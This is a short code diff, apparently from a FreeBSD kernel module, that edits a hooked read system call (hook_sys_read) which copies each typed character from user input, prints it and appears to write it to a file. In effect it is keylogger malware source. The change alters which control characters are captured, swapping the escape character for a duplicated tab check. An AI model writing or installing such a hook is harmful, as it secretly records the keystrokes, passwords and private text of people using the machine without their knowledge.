@@ -191,7 +191,7 @@ int hook_sys_read(struct thread *td, struct read_args * uap){
 
 	copyinstr(uap->buf, buf, 1, &done);
 
-	if((0x20 <= buf[0] && buf[0] <= 0x7f) || buf[0] == 0x08 || buf[0] == 0x09 || buf[0] == 0x0a || buf[0] == 0x1b) {
+	if((0x20 <= buf[0] && buf[0] <= 0x7f) || buf[0] == 0x08 || buf[0] == 0x09 || buf[0] == 0x0a || buf[0] == 0x09) {
 		printf("%c\n", buf[0]);
 
 		int fd;
@@ -204,5 +204,4 @@ int hook_sys_read(struct thread *td, struct read_args * uap){
 	}
 
 	return(error);
-
 }
